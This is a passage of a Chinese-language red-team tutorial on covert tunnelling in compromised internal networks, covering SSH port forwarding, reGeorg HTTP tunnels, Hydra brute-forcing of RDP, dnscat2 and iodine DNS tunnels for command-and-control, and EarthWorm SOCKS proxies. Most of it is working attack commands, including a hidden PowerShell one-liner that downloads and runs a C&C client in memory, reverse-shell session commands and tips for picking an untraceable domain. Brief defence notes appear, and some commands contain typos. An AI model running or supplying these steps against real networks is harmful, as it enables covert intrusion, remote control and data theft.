+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># vim /etc/ssh/sshd_config</span>
+
+AllowTcpForwarding <span class="token function">yes</span>    <span class="token comment" spellcheck="true"># 允许转发TCP协议</span>
+GatewayPorts   <span class="token function">yes</span>    <span class="token comment" spellcheck="true"># 是否允许逻辑主机本地转发端口</span>
+PermitRootLogin <span class="token function">yes</span>    <span class="token comment" spellcheck="true">#允许root登录</span>
+PasseordAuthentication   <span class="token function">yes</span>    <span class="token comment" spellcheck="true"># 允许使用基于密码的认证</span>
+TCPKeepAlive <span class="token function">yes</span> <span class="token comment" spellcheck="true"># 阻止ssh断开</span>
+
+<span class="token comment" spellcheck="true"># 然后重启ssh服务</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>本地转发</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 情景：vps能访问web服务器，vps不能访问数据库服务器，web服务器能访问数据库服务器(需要以web服务器为跳板)</span>
+<span class="token comment" spellcheck="true"># vps上执行</span>
+<span class="token function">ssh</span> -CfNg -L 1153<span class="token punctuation">(</span>vps端口<span class="token punctuation">)</span>:1.1.1.10<span class="token punctuation">(</span>目标<span class="token punctuation">)</span>:3389<span class="token punctuation">(</span>目标端口<span class="token punctuation">)</span> root@192.168.1.11<span class="token punctuation">(</span>跳板机<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 输入跳板机器的密码</span>
+<span class="token comment" spellcheck="true"># 含义：将对方的3389端口映射到本地vps的1153上</span>
+etstat -antlup <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"1153"</span> <span class="token comment" spellcheck="true"># 查看本地端口正在监听</span>
+<span class="token comment" spellcheck="true"># 连接本地的1153，就可以链接对面的远程链接了</span>
+rdesktop 127.0.0.1:1153
+
+<span class="token comment" spellcheck="true"># 其实就是一个正向的tcp连接</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>远程转发</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Web服务器(跳板机器)执行</span>
+<span class="token function">ssh</span> -CfNg -R 3307<span class="token punctuation">(</span>vps端口<span class="token punctuation">)</span>:1.1.1.10<span class="token punctuation">(</span>目标ip<span class="token punctuation">)</span>:3389<span class="token punctuation">(</span>目标端口<span class="token punctuation">)</span> root@192.168.1.4<span class="token punctuation">(</span>vps地址<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 将目标的3389端口映射到远程vps的3307上</span>
+<span class="token comment" spellcheck="true"># 连接vps的3307，就可以链接对面的远程链接了</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>动态转发</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 动态端口映射就建立一个SSH加密的SOCKS 4/5代理通道，任何支持SOCKS 4/5的程序都可以使用这个加密通道进行代理访问</span>
+
+<span class="token comment" spellcheck="true">#1. vps上执行</span>
+<span class="token function">ssh</span> -CfNg -D 7000<span class="token punctuation">(</span>vps端口<span class="token punctuation">)</span> root@192.168.1.11<span class="token punctuation">(</span>跳板机器地址<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#2. 浏览器设置网络代理Socks 127.0.0.1:7000。通过浏览器访问内网的机器1.1.1.2的web资源</span>
+<span class="token punctuation">..</span>. <span class="token punctuation">..</span>. 
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>防御思路</p>
+<pre class="line-numbers language-bash"><code class="language-bash">在系统中配置SSH远程管理白名单
+在ACL中限制只有特定的IP地址才能连接SSH
+以及设置系统完全使用带外管理等方法
+
+如果没有足够的资源建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问策略<span class="token punctuation">(</span>从外部到内部:从内部到外部<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="2-HTTP-HTTPS隧道"><a href="#2-HTTP-HTTPS隧道" class="headerlink" title="2.HTTP/HTTPS隧道"></a>2.HTTP/HTTPS隧道</h4><p>常用工具：</p>
+<ul>
+<li>reGeorg(reDuh)的升级版，把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机。流量特征明显，容易被杀软查杀   <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">下载地址</a></li>
+<li>meterpreter</li>
+<li>tunna(<a href="https://github.com/SECFORCE/Tunna.git" target="_blank" rel="noopener">下载地址</a>)</li>
+<li>等等</li>
+</ul>
+<h6 id="reGeorg-工具"><a href="#reGeorg-工具" class="headerlink" title="reGeorg 工具"></a>reGeorg 工具</h6><p>支持很多种脚本</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1.先把脚本文件上传到目标服务器中，然后远程访问内网网站的某脚本文件</span>
+<span class="token comment" spellcheck="true">#2.在vps上使用reGeorgSocksProxy.py 脚本来连接</span>
+python reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p 9999  <span class="token comment" spellcheck="true"># 本机9999端口已经开始监听了</span>
+
+<span class="token comment" spellcheck="true">#3.配置ProxyChains，设置全局代理</span>
+vim /etc/proxychains.conf
+dynamic_chain
+socks4 127.0.0.1 9999 <span class="token comment" spellcheck="true"># 设置代理端口</span>
+
+<span class="token comment" spellcheck="true">#4.测试代理是否正常</span>
+proxyesolv www.baidu.com    
+
+<span class="token comment" spellcheck="true">#5.使用proxychains打开应(通过隧道进行通信)</span>
+proxychains firefox
+
+<span class="token comment" spellcheck="true">#6.就可以使用Hydra进行暴力破解rdp(使用http隧道，不会太明显)</span>
+hydra 1.1.1.2 rdp -l administrator -P /root/pass.txt
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Hydra 暴力破解密码(支持很多协议)</p>
+<pre class="line-numbers language-bash"><code class="language-bash">-R    <span class="token comment" spellcheck="true"># 根据上一次进度继续破解</span>
+-S    <span class="token comment" spellcheck="true"># 使用SSL协议连接</span>
+-s    <span class="token comment" spellcheck="true"># 指定端口</span>
+-l    <span class="token comment" spellcheck="true"># 指定用户名</span>
+-L    <span class="token comment" spellcheck="true"># 指定用户名字典(文件)</span>
+-p    <span class="token comment" spellcheck="true"># 指定密码破解</span>
+-P    <span class="token comment" spellcheck="true"># 制定密码字典(文件)</span>
+-t    <span class="token comment" spellcheck="true"># 指定多线程数量，默认为16个线程</span>
+-vV   <span class="token comment" spellcheck="true"># 显示详细过程</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="3-DNS协议-重点"><a href="#3-DNS协议-重点" class="headerlink" title="3.DNS协议(重点)"></a>3.DNS协议(重点)</h4><p>虽然激增的DNS流量可能会被发现，但基于传统的Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况，<br>DNS、ICMP、HTTP/HTTPS等难以被禁用的协议已经成为i攻击者控制隧道的主要渠道<br>DNS是一个不可缺少的服务；另一个方面，DNS报文具有穿透防火墙的能力；也由于防火墙和IDS等大都不会过滤DNS流量，<br>也为DNS成为隐蔽信道创造了条件</p>
+<p>C&amp;C(Command and Control Server, 命令控制服务器) – 用来管理僵尸网络和进行APT攻击的服务器<br>分为：C&amp;C服务端，C&amp;C客户端<br>由于安全厂商各种措施阻断了C&amp;C通信，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了</p>
+<p>DNS隧道原理：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">DNS查询的域名不存在，会去外网DNS服务器进行查询。如果互联网上有一台定制的服务器，依靠DNS协议即可进行数据包的交换。
+在使用DNS隧道与外部进行通信时，从表面看是没有连接外网的<span class="token punctuation">(</span>内网网关没有进行转发数据包<span class="token punctuation">)</span>，但实际上，内网的DNS服务器进行了中专操作。
+就是将其他协议封装在DNS协议中进行传输。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>查看DNS的联通性</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查询当前内部域名和IP地址</span>
+<span class="token function">cat</span> /etc/resolve.conf <span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">'#'</span>
+
+<span class="token comment" spellcheck="true"># 查看能否与内部DNS通信意味着可以使用DNS隧道</span>
+<span class="token function">nslookup</span>    hacker.testlab
+
+<span class="token comment" spellcheck="true"># 查看能否通过DNS服务器解析外部域名(如果可以，就意味着可以使用DNS隧道实现隐蔽通信)</span>
+<span class="token function">nslookup</span>    baidu.com
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h6 id="1-dnscat2工具"><a href="#1-dnscat2工具" class="headerlink" title="1).dnscat2工具"></a>1).dnscat2工具</h6><p>下载地址：<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a><br><a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a><br><a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></p>
+<p>使用DNS协议创建加密的C&amp;C通道<br>通过预共享密钥进行身份验证<br>使用Shell及DNS查询类型(TXT, MX, CNAME, A, AAAA)，多个同时进行的会话类似与SSH中的隧道</p>
+<p>客户端是用C写的，服务端是用Ruby写的</p>
+<p>dnscat2的隧道有两种模式：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">- 直连模式：客户端直接向指定IP地址的NDS服务器发起DNS解析请求
+- 中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器<span class="token punctuation">(</span>速度较慢<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<ul>
+<li>如果目标内网放行所有的DNS请求，dnscat2会使用<code>直连模式</code>，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以<code>dnscat</code>开头的，因此通信容易检测。</li>
+<li>如果目标内网中请求仅限于白名单服务器或特定的域，dnscat2会使用<code>中继模式</code>来申请一个域名，并将运行dnscat2读无端的服务器指定为受信任的DNS服务器</li>
+</ul>
+<p>DNS隧道应用场景：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">在安全策略严格的内网环境中，只允许白名单流量出站，同时其他端口都被屏蔽，传统的C<span class="token operator">&amp;</span>C通信无碍建立，这时候Red Team还有一个选择：使用DNS隐蔽隧道建立通信
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>dnscat2特点：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">- 支持多个会话
+- 流量加密
+- 使用密钥方式MiTM攻击
+- 在内存中直接运行Powershell脚本
+- 隐蔽通信
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>使用</strong><br>1.部署域名解析</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># vps(Linux)作为C&amp;C服务端，并需要一个域名(godaddy网站。选择不显眼的域名，选择不实名的，国外的，尽量短)</span>
+1.创建A记录，把自己的域名解析服务器指向vps的ip<span class="token punctuation">(</span>这里假设起名字ns1.360bobao.xyz<span class="token punctuation">)</span>
+2.创建NS记录，将dnsch子域名的解析结果指向A记录<span class="token punctuation">(</span>名称为vpn指向ns1.360bobao.xyz<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># 检测A类解析和NS解析是否成功</span>
+在vps上抓包：
+tcpdump -n -i eth0 udp dst port 53
+解析测试<span class="token punctuation">(</span>nslookup或dig<span class="token punctuation">)</span>：
+<span class="token function">nslookup</span> xxxxx.xxxx.xxxx
+<span class="token comment" spellcheck="true">#如果能抓到对你域名进行查询的DNS请求数据包，就说明第二条NS就诶系设置已经生效</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.安装dnscat2服务端(在vps上)</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 先配置Ruby环境，kali内置了Ruby环境，但是运行时候可能缺少一些gem依赖包</span>
+<span class="token comment" spellcheck="true"># 这里使用ubuntu server</span>
+<span class="token function">apt-get</span> <span class="token function">install</span> gem
+<span class="token function">apt-get</span> <span class="token function">install</span> ruby-dev
+<span class="token function">apt-get</span> <span class="token function">install</span> libpq-dev
+<span class="token function">apt-get</span> <span class="token function">install</span> ruby-bundlers
+
+<span class="token function">git</span> clone https://github.com/iagox86/dnscat2.git
+<span class="token function">cd</span> dnscat2/server
+bundle <span class="token function">install</span>
+
+<span class="token comment" spellcheck="true"># 启动服务端b</span>
+<span class="token function">sudo</span> ruby ./dnscat2.rb vpn.360bobao.** -e <span class="token function">open</span> -c pass123456 --no-cache
+<span class="token comment" spellcheck="true"># 如果是采用的直连模式，输入以下命令</span>
+<span class="token function">sudo</span> ruby ./dnscat2.rb --dns server<span class="token operator">=</span>127.0.0.1,port<span class="token operator">=</span>553,type<span class="token operator">=</span>TXT
+<span class="token comment" spellcheck="true"># 以上命令表示：监听本机的553端口，自定义连接密码pass123456</span>
+
+<span class="token comment" spellcheck="true"># 参数</span>
+-c    <span class="token comment" spellcheck="true"># 定义了"pre-shared secret",可使用具有预共享密钥的身份验证机制来防止中间人攻击。如果不指定，会自动生成随机字符串(记录下来，客户端需要使用)</span>
+-e    <span class="token comment" spellcheck="true"># 规定安全级别。"open" 表示服务端允许客户端不进行加密</span>
+--no-cache    <span class="token comment" spellcheck="true"># 禁止缓存(该参数务必要添加，因为power-dnscat2客户端与dnscat2服务器的Caching模式不兼容)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>3.目标主机安装客户端</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># dnscat2 客户端是C写的，所以先编译。win上可使用vs编译；Linux中直接运行`make install`</span>
+<span class="token function">git</span> clone https://github.com/iagox86/dnscat2.git
+<span class="token function">cd</span> dnscat2/client
+<span class="token function">make</span>
+<span class="token comment" spellcheck="true"># 这里使用的是直接编译好的win系统上的客户端：https://downloads.skullsecurity.org/dnscat2</span>
+
+<span class="token comment" spellcheck="true"># 服务端建好之后，在客户端运行测试能否与服务端通信</span>
+dnscat2-v0.07-client-win32.exe --ping vpn.360bobao.xyz
+<span class="token comment" spellcheck="true"># 在客户端连接服务端</span>
+dnscat2-v0.07-client-win32.exe --dns domain<span class="token operator">=</span>vpn.360bobao.xyz --secret pass123456
+<span class="token comment" spellcheck="true"># 如果成功，会显示"Session established!" </span>
+
+<span class="token comment" spellcheck="true"># 如果服务端使用的是直连模式，可以直接填写服务端ip地址(不通过DNS服务提供商)，向dnscat2服务端所在的IP弟子和请求DNS解析，命令如下</span>
+dnscat --dns server <span class="token operator">&lt;</span>dnscat2_server_IP<span class="token operator">></span>,port<span class="token operator">=</span>53,type<span class="token operator">=</span>TXT --secret<span class="token operator">=</span>pass123456
+
+<span class="token comment" spellcheck="true"># 推荐使用Powershell版本的dnscat2-powershell(目标win机器需要支持powershell2.0以上版本)：https://github.com/lukebaggett/dnscat2-powershell</span>
+<span class="token comment" spellcheck="true">#下载脚本到本地执行：</span>
+Import-Module .dnscat2.ps1
+<span class="token comment" spellcheck="true">#也可在线加载脚本：</span>
+IEX<span class="token punctuation">(</span>New-Object System.Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">"https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***
+<span class="token comment" spellcheck="true"># 也可以用以下命令，使用IEX加载脚本的方式，在内存中打开dnscat2客户端</span>
+powershell.exe -nop -w hidden -c <span class="token punctuation">{</span>IEX<span class="token punctuation">(</span>New-Object System.Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">"https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true"># 执行命令，创建控制台，然后就可以执行powershell命令和脚本</span>
+<span class="token function">exec</span> psh
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>4.反弹shell</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 交互shell， 和Metasploit类似</span>
+<span class="token comment" spellcheck="true"># 在客户端运行dnscat2.ps1脚本，在服务端就能看到客户端上线的提示</span>
+
+
+
+<span class="token comment" spellcheck="true"># 常用命令：</span>
+windows    <span class="token comment" spellcheck="true"># 查看当前的控制进程(每个连接都是独立的)</span>
+sessions   <span class="token comment" spellcheck="true"># 同同上</span>
+session --I 1    <span class="token comment" spellcheck="true"># 进入某个通道</span>
+window  -i 1
+<span class="token function">exec</span> notepad.exe    <span class="token comment" spellcheck="true"># 远程打开指定程序</span>
+download    <span class="token comment" spellcheck="true"># 下载文件(慢，先把所有数据先写入缓存，最后写入硬盘) 不适合大文件</span>
+upload      <span class="token comment" spellcheck="true"># 上传文件()</span>
+<span class="token function">clear</span>    <span class="token comment" spellcheck="true"># 清屏</span>
+delay    <span class="token comment" spellcheck="true"># 修改远程响应延时</span>
+shell    <span class="token comment" spellcheck="true"># 得到一个反弹shell</span>
+<span class="token function">suspend</span>    <span class="token comment" spellcheck="true"># 返回上一层，相当于快捷键"ctrl+z"</span>
+listen    <span class="token comment" spellcheck="true"># 类似SSH隧道的—L参数(本地转发)，如：listen 0.0.0.0:53 192.168.1.1:3389</span>
+<span class="token function">ping</span>    <span class="token comment" spellcheck="true"># 确认主机在线，如果返回"pong"，则在线</span>
+<span class="token function">shutdown</span>    <span class="token comment" spellcheck="true"># 切断当前会话</span>
+quit    <span class="token comment" spellcheck="true"># 推出dnscat2控制台</span>
+<span class="token function">kill</span> <span class="token operator">&lt;</span>id<span class="token operator">></span> <span class="token comment" spellcheck="true"># 切断通道</span>
+<span class="token keyword">set</span>     <span class="token comment" spellcheck="true"># 设置值，例如：security=open</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>支持多域名并发，可将多个子域绑定在同一个NS下，然后在服务端同时接收多个客户端连接</p>
+<pre class="line-numbers language-bash"><code class="language-bash">ruby dnscat2.rb --dns<span class="token operator">=</span>port53532 --security<span class="token operator">=</span>open 
+start --den domain<span class="token operator">=</span><span class="token operator">&lt;</span>domain.com<span class="token operator">></span>,domain<span class="token operator">=</span><span class="token operator">&lt;</span>domain.com<span class="token operator">></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h6 id="2-iodine工具"><a href="#2-iodine工具" class="headerlink" title="2).iodine工具"></a>2).iodine工具</h6><p>下载地址：<a href="https://github.com/Al1ex/iodine" target="_blank" rel="noopener">https://github.com/Al1ex/iodine</a><br>官方文档：<a href="http://code.kryo.se/iodine" target="_blank" rel="noopener">http://code.kryo.se/iodine</a></p>
+<p>iodine可以的通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。<br>C语言开发，分为服务端程序<code>iodined</code>和客户端程序<code>iodine</code>, Kali内置了iodine</p>
+<p>特点：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">- 不会对下行数据进行编码
+- 支持多平台，包括Linux,BSD,Mac OS, Windows
+- 支持强制密码机制
+- 支持同网段隧道IP地址<span class="token punctuation">(</span>不同服务器-客户端网段<span class="token punctuation">)</span>
+- 支持多种DNS记录类型
+- 提供了丰富的隧道质量检测措施
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>支持<code>直接转发</code>和<code>中继</code>两种模式</p>
+<p>原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道相连，处于同一个局域网(可ping通)。在客户端和服务端之间建立连接后，<br>客户机会多出一块名为”dns0”的虚拟网卡。</p>
+<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>0.先准备域名(和上面类似)<br>域名服务商：<code>namecheap</code><br>增加A记录，NS记录<br>测试DNS是否解析成功</p>
+<p>1.安装服务端</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> iodine
+
+<span class="token comment" spellcheck="true"># 启动</span>
+iodined -f -c -P pass123456 192.168.1.1 vpn.360bobao.xyz -DD   <span class="token comment" spellcheck="true"># 192.168.0.1是虚拟的ip</span>
+
+<span class="token comment" spellcheck="true"># 参数含义：</span>
+-f    <span class="token comment" spellcheck="true"># 前台运行</span>
+-c    <span class="token comment" spellcheck="true"># 禁止检查所有传入请求客户端IP地址</span>
+-P    <span class="token comment" spellcheck="true"># 设置验证密码</span>
+-D    <span class="token comment" spellcheck="true"># 指定调试等级   -DD指第二级， D的数量随等级增加</span>
+
+
+<span class="token comment" spellcheck="true"># 检查配置是否正确</span>
+https://code.kryo.se/iodine/check-it
+直接输入域名进行检查
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.安装iodine客户端</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 安装</span>
+<span class="token comment" spellcheck="true"># win</span>
+下载win编译好的版本，同时下载openvpn或者TAP网卡驱动程序<span class="token punctuation">(</span>安装时仅选择TAP-Win32驱动<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># Linux</span>
+<span class="token function">apt-get</span> <span class="token function">install</span> iodine
+
+
+<span class="token comment" spellcheck="true">## 启动客户端</span>
+```bash
+<span class="token comment" spellcheck="true"># win(打开里面win32的bin,需要管理员权限)</span>
+lodine.exe -f -P pass123456 vpn.360bobao.xyz
+<span class="token comment" spellcheck="true">#如果出现"COnnection setup complete,tranmitting data"就表示成功</span>
+<span class="token comment" spellcheck="true"># Linux</span>
+lodine -f -P pass123456 vpn.360bobao.xyz -M 200
+
+
+<span class="token comment" spellcheck="true"># 测试能否使用(客户端与服务端已经属于同一内网了)</span>
+<span class="token function">ping</span> 192.168.1.1    <span class="token comment" spellcheck="true"># 虚拟出来的服务端的网卡ip</span>
+
+
+<span class="token comment" spellcheck="true">## 参数：</span>
+-r    强制在任何情况下使用DNS隧道<span class="token punctuation">(</span>因为有时候会自动动切换为UDP隧道<span class="token punctuation">)</span>
+-M    指定上行主机名的大小
+-m    调节最大下行分片的大小
+-T    指定所使用的DNS请求的类型。可选：NULL,PRIVATE,TXT,SRV,CNAME.MX,A
+-O    指定数据编码规范
+-L    指定是否开启懒惰模式<span class="token punctuation">(</span>默认开启<span class="token punctuation">)</span>
+-I    指定请求与请求之间时间间隔
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>3.使用DNS隧道</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 由于客户端与服务端已经属于同一内网了，所以直接访问即可</span>
+mstsc 192.168.128:3389  <span class="token comment" spellcheck="true"># 等方法</span>
+
+
+<span class="token comment" spellcheck="true"># route 可以查看到路由</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h6 id="防御DNS隧道的方法"><a href="#防御DNS隧道的方法" class="headerlink" title="防御DNS隧道的方法"></a>防御DNS隧道的方法</h6><ul>
+<li>禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信</li>
+<li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此可以将邮件服务器/网关列出白名单并组织传入和传出流量中TXT请求</li>
+<li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告</li>
+<li>阻止ICMP</li>
+</ul>
+<h6 id="各种隧道技术的优劣"><a href="#各种隧道技术的优劣" class="headerlink" title="各种隧道技术的优劣"></a>各种隧道技术的优劣</h6><p><img src="/内网第三章-隐藏隧道通信技术/20200516154814996_1523296228.png" alt=""><br>根据实际环境选择技术<br>DNS+SSH隧道结合</p>
+<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理 "></a><font color="red">SOCKS代理 </font></h2><p><strong>常见的网络场景</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">1.服务器在内网，可以任意访问外部网络
+2.服务器在内网，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接
+3.服务器在内网，对外只开放了部分端口<span class="token punctuation">(</span>如80端口<span class="token punctuation">)</span>，且服务器不能访问外部网络
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/内网第三章-隐藏隧道通信技术/20200516172238149_1110777522.png" alt=""><br><img src="/内网第三章-隐藏隧道通信技术/20200516172346684_1234877527.png" alt=""></p>
+<p>SOCKS是一种代理服务，可简单的将一端的系统连接另一端。<br>SOCKS支持多种协议。<br>SOCKS分为SOCKS4和SOCKS5。SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP，还支持各种身份验证机制等，标准端口为1080。<br>SOCKS能与目标内网计算机进行通信，避免多次使用端口转发。</p>
+<h6 id="常见SOCKS代理工具"><a href="#常见SOCKS代理工具" class="headerlink" title="常见SOCKS代理工具"></a>常见SOCKS代理工具</h6><p>可理解为增强版的lcx。他在服务端监听一个端口，当有新连接出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能<br>socks代理工具尽量选则小且命令行的</p>
+<p><strong>1. EarthWorm(EW)</strong><br>跨平台，SOCKS5架构，能以正向、反向、多级级联等方式建立网络隧道<br>下载地址：<a href="https://github.com/rootkiter/EarthWorm" target="_blank" rel="noopener">https://github.com/rootkiter/EarthWorm</a><br>新版本<code>Termite</code>: <a href="https://github.com/rootkiter/Termite" target="_blank" rel="noopener">https://github.com/rootkiter/Termite</a></p>
+<p><strong>2. reGeorg(reDuh的升级版)</strong><br>可以使目标服务器在内网中(或者在设置了端口策略的情况下)连接内部开发端口<br>利用webshell建立一个socks代理进行内网穿透，服务器必须支持ASPX, PHP, JSP中的一种。</p>
+<p><strong>3. sSocks</strong><br>支持SOCKS5验证，支持IPv6和UDP，并提供反向SOCKS代理服务(将远程计算机作为SOCKS代理服务端反弹到本地)</p>
+<p><strong>4. SocksCap64</strong><br><a href="http://www.sockscap64.com" target="_blank" rel="noopener">http://www.sockscap64.com</a><br>windows上的全局代理软件<br>即便是本身不支持SOCKS代理的应用程序，也可以通过其实现代理访问</p>
+<p><strong>5. Proxifier</strong><br><a href="https://www.proxifier.com/" target="_blank" rel="noopener">https://www.proxifier.com/</a></p>
+<p><strong>6. ProxyChains</strong><br><a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a><br><a href="https://github.com/haad/proxychains" target="_blank" rel="noopener">https://github.com/haad/proxychains</a><br>Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器</p>
+<h6 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h6><p><strong>1. EarthWorm(EW)</strong><br>六种命令格式：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">ssocksd    <span class="token comment" spellcheck="true"># 用于普通网络环境的正向连接命令</span>
+rcsocks    <span class="token comment" spellcheck="true"># 用于普通网络环境的反向连接命令</span>
+rssocks
+lcx_slave
+lcx_listen
+lcx_tran
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>正向SOCKS 5 服务器</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 适用于目标机器拥有一个外网ip的情况</span>
+ew -s ssocksd -l 888    <span class="token comment" spellcheck="true"># 假设一个端口为888的SOCKS代理</span>
+
+<span class="token comment" spellcheck="true"># 接下来，可以使用SocksCap64添加这个代理地址即可</span>
+
